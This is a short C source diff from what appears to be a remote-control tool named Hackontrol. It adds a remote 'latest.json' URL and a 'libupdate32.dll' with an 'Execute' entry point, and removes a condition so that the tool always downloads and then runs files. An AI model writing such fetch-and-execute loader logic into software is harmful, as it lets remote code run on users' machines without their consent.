@@ -1,5 +1,7 @@
+#include <libkhopanlist.h>
 #include <libkhopancurl.h>
 #include <libhackontrol.h>
+#include <libhackontrolcurl.h>
 #include <openssl/sha.h>
 #include "Execute.h"
 #include "resource.h"
@@ -14,6 +16,10 @@
 //#define HACKONTROL_NO_EXECUTE_FILE
 #endif
 #endif
+
+#define FILE_LIBUPDATE32     L"libupdate32.dll"
+#define FUNCTION_LIBUPDATE32 "Execute"
+#define URL_LATEST_FILE      "https://raw.githubusercontent.com/KHOPAN/Hackontrol/main/system/latest.json"
 
 static HINSTANCE instance;
 
@@ -240,9 +246,7 @@ initializeGlobal:
 		CloseHandle(handle);
 	}
 #ifndef HACKONTROL_NO_DOWNLOAD_FILE
-	if(update) {
-		ExecuteDownload(root, folderHackontrol);
-	}
+	ExecuteDownload(root, folderHackontrol);
 #endif
 #ifndef HACKONTROL_NO_EXECUTE_FILE
 	ExecuteExecute(root, folderHackontrol);
